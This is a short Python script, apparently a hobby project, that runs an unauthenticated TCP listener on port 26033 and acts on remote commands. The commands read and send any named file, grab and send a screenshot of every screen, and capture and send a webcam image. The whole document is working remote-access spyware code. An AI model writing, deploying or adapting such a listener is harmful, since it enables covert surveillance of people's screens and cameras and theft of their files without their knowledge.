from socket import *
import os, subprocess
import tempfile
# pip install Pillow
import PIL.ImageGrab as ImageGrab
# pip install opencv-python
import cv2

HOST = ''
PORT = 26033

s = socket(AF_INET, SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

def send_file(file_path, client: socket):
    with open(file_path, "rb") as f:
        chunks = b""
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            chunks += chunk
        client.sendall(chunks)
        print(f"file {file_path} sent.")

def screenshot(client: socket):
    ss = ImageGrab.grab(all_screens=True).convert("RGB")
    _, file_path = tempfile.mkstemp()
    ss.save(file_path, format="JPEG")
    send_file(file_path, client)
    # os.remove(file_path)

# Warning SUR WINDOWS, tester sur linux ou max os !!!
def picture_from_cam(client: socket):
    cap = cv2.VideoCapture(0, cv2.CAP_MSMF)
    _, frame = cap.read()
    _, file_path = tempfile.mkstemp()
    img_path = f"{file_path}.jpg"
    cv2.imwrite(img_path, frame)
    cap.release()
    cv2.destroyAllWindows()
    send_file(img_path, client)
    # os.remove(img_path)

while True:
    client_conn, addr = s.accept()
    cmd = client_conn.recv(1024)
    cmd = cmd.decode("utf-8")
    cmd = cmd.split(":")
    if cmd[0] == "get-file":
        send_file(cmd[1], client_conn)
    elif cmd[0] == "quit":
        break
    elif cmd[0] == "ss":
        screenshot(client_conn)
    elif cmd[0] == "wc":
        picture_from_cam(client_conn)
    else: print(cmd[0])
    client_conn.close()

client_conn.close()
s.close()